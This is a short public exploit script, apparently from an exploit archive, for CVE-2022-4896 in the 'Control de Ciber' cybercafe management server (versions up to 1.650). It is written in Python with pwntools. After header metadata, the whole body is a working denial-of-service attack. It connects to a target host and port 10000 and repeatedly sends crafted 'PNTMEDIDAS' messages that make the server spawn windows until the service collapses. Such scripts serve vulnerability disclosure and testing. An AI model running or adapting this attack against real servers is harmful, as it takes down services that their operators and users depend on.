# Exploit Title: Control de Ciber pntmedidas - Denial of Service (DoS)
# Date: 23/02/2023
# Exploit Authors: sapellaniz
# Vendor Homepage: http://www.cbm.com.ar
# Software Link: http://www.cbm.com.ar/downloads.htm
# Version: <= 1.650
# Tested on: Linux
# CVE: CVE-2022-4896
# Github repo: https://github.com/sapellaniz/CVE-2022-4896

from pwn import *
from time import sleep

SERVER_IP = "192.168.56.101"
SERVER_PORT = 10000

def dos_pntmedidas(ip, port):
    """
    When the server receives the string "PNTMEDIDAS: <n1> <n2> <n3> <n4> <n5> <n6> <n7>"
    a window spanws with <n2> columns and <n3> rows of <n6> bits colors.
    This function spawn windows on the server until the service collapses.
    """
    s = remote(ip, port)
    for _ in range(10000):
        s.send(f'PNTMEDIDAS: 0 10 1 0 0 16 0\r\n'.encode())
        sleep(.05)
        s.send(f'PNTMEDIDAS: 0 1 10 0 0 16 0\r\n'.encode())
        sleep(.05)


if __name__ == "__main__":
    dos_pntmedidas(SERVER_IP, SERVER_PORT)
